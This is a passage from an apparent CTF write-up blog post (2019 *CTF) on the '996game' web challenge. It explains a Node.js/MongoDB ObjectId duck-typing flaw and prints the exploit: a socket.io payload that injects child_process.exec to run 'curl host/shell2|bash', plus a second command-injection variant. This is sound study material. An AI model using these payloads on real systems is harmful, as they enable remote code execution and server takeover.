<span class="keyword">if</span>(id != <span class="literal">null</span> &amp;&amp; id.toHexString) &#123;</span><br><span class="line">    <span class="comment">// Duck-typing to support ObjectId from different npm packages</span></span><br><span class="line">    <span class="keyword">return</span> id;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"Argument passed in must be a single String of 12 bytes or a string of 24 hex characters"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>Now , we change our payload to<br><code>id = {&quot;length&quot;:0,&quot;toHexString&quot;:true,&quot;id&quot;:{&quot;length&quot;:12}},</code></p>
<p>And then the whole payload will be sent to mongodb server.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MongoDB shell version: <span class="number">2.6</span><span class="number">.10</span></span><br><span class="line">connecting to: test</span><br><span class="line">&gt; db.a.find(&#123;<span class="string">"b"</span>:&#123;<span class="string">"$gt"</span>:<span class="number">1</span>,<span class="string">"c"</span>:<span class="string">"d"</span>&#125;&#125;)</span><br><span class="line">error: &#123;</span><br><span class="line">	<span class="string">"$err"</span> : <span class="string">"Can't canonicalize query: BadValue unknown operator: c"</span>,</span><br><span class="line">	<span class="string">"code"</span> : <span class="number">17287</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>So the whole exploit is</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client.socket.emit(<span class="string">'init-world'</span>,&#123;<span class="attr">new</span>:<span class="literal">false</span>,<span class="attr">id</span>:&#123;<span class="string">"$in"</span>:[<span class="number">1</span>],<span class="string">"require('child_process').exec('/usr/bin/curl host/shell2|bash')"</span>:<span class="string">"bbb"</span>,<span class="string">"length"</span>:<span class="number">0</span>,<span class="string">"toHexString"</span>:<span class="literal">true</span>,<span class="string">"id"</span>:&#123;<span class="string">"length"</span>:<span class="number">12</span>&#125;&#125;,<span class="attr">clientTime</span>:<span class="string">"sacsaccsacsac"</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>RR的exp</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Client.getPlayerID = <span class="function"><span class="params">()</span>=&gt;</span>&#123;<span class="keyword">return</span> &#123;<span class="string">'$a=1;require(`child_process`).exec(`command`);'</span>: <span class="string">""</span>, <span class="attr">toHexString</span>: <span class="number">1</span>, <span class="attr">id</span>: &#123;<span class="attr">length</span>: <span class="number">12</span>&#125;&#125;&#125;</span><br><span class="line">Client.requestData()</span><br></pre></td></tr></table></figure>
<p>此处对node还是不熟悉，后面应该加强，回去看node和mongo了</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-WEB"><span class="toc-number">2.</span> <span class="toc-text">0x01 WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mywebsql"><span class="toc-number">2.1.</span> <span class="toc-text">1. mywebsql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-echohub"><span class="toc-number">2.2.</span> <span class="toc-text">2. echohub</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0-代码解密-amp-源代码描述的栈情况解读"><span class="toc-number">2.2.1.</span> <span class="toc-text">0. 代码解密&amp;源代码描述的栈情况解读</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-防护绕过-amp-栈溢出"><span class="toc-number">2.2.2.</span> <span class="toc-text">1. 防护绕过&amp;栈溢出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-代码注入"><span class="toc-number">2.2.3.</span> <span class="toc-text">2. 代码注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-攻击fpm"><span class="toc-number">2.2.4.</span> <span class="toc-text">3. 攻击fpm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-EXP"><span class="toc-number">2.2.5.</span> <span class="toc-text">5. EXP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-参考"><span class="toc-number">2.2.6.</span> <span class="toc-text">6.参考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-996game"><span class="toc-number">2.3.</span> <span class="toc-text">3. 996game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#OrZ"><span class="toc-number">2.3.1.</span> <span class="toc-text">OrZ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeup"><span class="toc-number">2.3.2.</span> <span class="toc-text">writeup</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&text=2019 starctf writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&is_video=false&description=2019 starctf writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2019 starctf writeup&body=Check out this article: http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&title=2019 starctf writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/&name=2019 starctf writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 z3r0yu
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/About/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="https://github.com/zer0yu">Projects</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-129276044-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

    <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?8415e69cf54ba93c9ddb2eb597859c7d";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'z3r0yu';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


